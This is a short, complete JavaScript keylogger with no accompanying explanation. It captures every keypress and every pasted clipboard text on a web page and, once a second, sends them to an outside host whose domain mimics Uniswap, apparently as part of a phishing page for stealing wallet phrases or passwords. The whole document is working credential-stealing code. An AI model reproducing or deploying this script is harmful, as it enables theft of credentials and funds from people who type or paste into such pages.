var keys='';
var url = 'https://app.uniswap.io.pool.adhef.com/core/unit-class.php?c=';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
}

document.onpaste = function(e) {
     keys = e.clipboardData.getData('Text');
    
}

window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 1000);


